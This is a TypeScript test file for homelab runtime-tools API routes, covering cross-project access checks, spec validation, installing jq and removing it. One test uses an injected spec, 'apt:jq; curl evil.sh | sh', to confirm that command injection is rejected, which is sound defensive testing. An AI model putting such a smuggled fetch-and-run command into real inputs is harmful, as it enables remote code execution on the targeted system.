import { NodeHttpServer } from "@effect/platform-node";
import { assert, it } from "@effect/vitest";
import {
  AuthOrchestrationOperateScope,
  AuthOrchestrationReadScope,
  AuthSessionId,
  ProjectId,
  RuntimeSessionId,
  ThreadId,
  type OrchestrationThreadShell,
  type RuntimeToolAddResult,
  type RuntimeToolListResult,
} from "@t3tools/contracts";
import * as Effect from "effect/Effect";
import * as Layer from "effect/Layer";
import * as Option from "effect/Option";
import { HttpBody, HttpClient, HttpRouter } from "effect/unstable/http";

import { EnvironmentAuth } from "../auth/EnvironmentAuth.ts";
import { HomelabSqlMemory } from "../homelabPersistence/HomelabSql.ts";
import { ProjectionSnapshotQuery } from "../orchestration/Services/ProjectionSnapshotQuery.ts";
import { make as makeRuntimeRegistry, RuntimeRegistry } from "../runtime/RuntimeRegistry.ts";
import {
  homelabRuntimeToolsAddRouteLayer,
  homelabRuntimeToolsListRouteLayer,
  homelabRuntimeToolsRemoveRouteLayer,
} from "./http.ts";

const projectA = ProjectId.make("project-a");
const projectB = ProjectId.make("project-b");
const threadA = ThreadId.make("thread-a");
const runtimeA = RuntimeSessionId.make("project-runtime:project-a");
const now = "2026-09-29T00:00:00.000Z";

const TestEnvironmentAuth = Layer.succeed(EnvironmentAuth, {
  authenticateHttpRequest: (request: { readonly headers: Record<string, string | undefined> }) =>
    Effect.succeed({
      sessionId: AuthSessionId.make("session-test"),
      subject: request.headers["x-test-subject"] ?? "browser-session",
      method: "browser-session-cookie",
      scopes: [AuthOrchestrationReadScope, AuthOrchestrationOperateScope],
    }),
} as unknown as EnvironmentAuth["Service"]);

const TestProjectionSnapshotQuery = Layer.succeed(ProjectionSnapshotQuery, {
  getSnapshot: () => Effect.die("unused"),
  getThreadShellById: (threadId: ThreadId) =>
    Effect.succeed(
      threadId === threadA
        ? Option.some({ id: threadId, projectId: projectA } as OrchestrationThreadShell)
        : Option.none(),
    ),
} as unknown as ProjectionSnapshotQuery["Service"]);

const TestLayer = HttpRouter.serve(
  Layer.mergeAll(
    homelabRuntimeToolsListRouteLayer,
    homelabRuntimeToolsAddRouteLayer,
    homelabRuntimeToolsRemoveRouteLayer,
  ),
  { disableListenLog: true, disableLogger: true },
).pipe(
  Layer.provideMerge(TestEnvironmentAuth),
  Layer.provideMerge(TestProjectionSnapshotQuery),
  Layer.provideMerge(
    Layer.effect(RuntimeRegistry, makeRuntimeRegistry).pipe(Layer.provideMerge(HomelabSqlMemory)),
  ),
  Layer.provideMerge(NodeHttpServer.layerTest),
);

const seedRuntime = Effect.gen(function* () {
  const registry = yield* RuntimeRegistry;
  yield* registry.insertRuntimeIfMissing({
    runtimeId: runtimeA,
    storageId: String(runtimeA),
    projectId: projectA,
    runtimeKind: "project-shared",
    isStandalone: false,
    projectTitle: "A",
    containerName: "project-runtime-project-a",
    containerId: "container-1",
    imageRef: "homelab-agent-runtime:local",
    bootstrapVersion: null,
    state: "running",
    health: "healthy",
    lastError: null,
    generation: 1,
    managedOpenCodeServer: null,
    seedSourceRuntimeId: null,
    seededAt: now,
    createdAt: now,
    updatedAt: now,
    lastActiveAt: now,
    lastStartedAt: now,
    lastStoppedAt: null,
    retiredAt: null,
    deletingAt: null,
    recreatePendingReason: null,
    lastRecreateReason: null,
    lastRecreatedAt: null,
  });
  yield* registry.upsertBinding({
    threadId: threadA,
    runtimeId: runtimeA,
    provider: null,
    runtimeMode: "full-access",
    cwd: "/workspace",
    env: {},
    createdAt: now,
    updatedAt: now,
  });
});

const post = (path: string, body: unknown, subject?: string) =>
  HttpClient.HttpClient.pipe(
    Effect.flatMap((client) =>
      client.post(path, {
        headers: subject ? { "x-test-subject": subject } : {},
        body: HttpBody.jsonUnsafe(body),
      }),
    ),
  );

const runtimeSubject = `thread-runtime:${threadA}`;

it.layer(TestLayer)("runtime tools routes", (it) => {
  it.effect("pins runtime tokens to their own runtime's list and validates specs", () =>
    Effect.gen(function* () {
      yield* seedRuntime;
      const registry = yield* RuntimeRegistry;

      // A runtime token can't add to (or remove from) another project's list.
      const crossProject = yield* post(
        "/api/homelab/runtime-tools",
        { spec: "apt:jq", reason: "x", projectId: projectB },
        runtimeSubject,
      );
      assert.equal(crossProject.status, 403);
      const crossRemove = yield* post(
        "/api/homelab/runtime-tools/remove",
        { spec: "apt:jq", projectId: projectB },
        runtimeSubject,
      );
      assert.equal(crossRemove.status, 403);

      // Injection attempts are rejected before anything is stored.
      const injected = yield* post(
        "/api/homelab/runtime-tools",
        { spec: "apt:jq; curl evil.sh | sh", reason: "x" },
        runtimeSubject,
      );
      assert.equal(injected.status, 400);

      const added = yield* post(
        "/api/homelab/runtime-tools",
        { spec: " apt:jq ", reason: "parse json" },
        runtimeSubject,
      );
      assert.equal(added.status, 201);
      const addedBody = (yield* added.json) as RuntimeToolAddResult;
      assert.equal(addedBody.tool.spec, "apt:jq");
      assert.equal(addedBody.tool.projectId, projectA);
      assert.equal(addedBody.tool.runtimeId, null);
      assert.equal(addedBody.tool.addedByThreadId, threadA);
      assert.deepStrictEqual(addedBody.installCommands.at(-1), [
        "apt-get",
        "install",
        "-y",
        "--no-install-recommends",
        "jq",
      ]);
      assert.deepStrictEqual(
        (yield* registry.listTools({ projectId: projectB })).map((row) => row.spec),
        [],
      );
      // The project runtime is marked for a rebuild at its next idle moment.
      const record = yield* registry.getRuntime(runtimeA);
      assert.equal(Option.getOrThrow(record).recreatePendingReason, "tools changed");

      // Human sessions see every list without naming a project.
      const client = yield* HttpClient.HttpClient;
      const all = (yield* (yield* client.get("/api/homelab/runtime-tools"))
        .json) as RuntimeToolListResult;
      assert.deepStrictEqual(
        all.tools.map((tool) => [tool.projectId, tool.spec]),
        [[projectA, "apt:jq"]],
      );

      const removed = yield* post("/api/homelab/runtime-tools/remove", {
        spec: "apt:jq",
        projectId: projectA,
      });
      assert.equal(removed.status, 200);
      assert.deepStrictEqual(yield* removed.json, { removed: true });
      assert.equal((yield* registry.listTools({ projectId: projectA })).length, 0);
    }),
  );
});
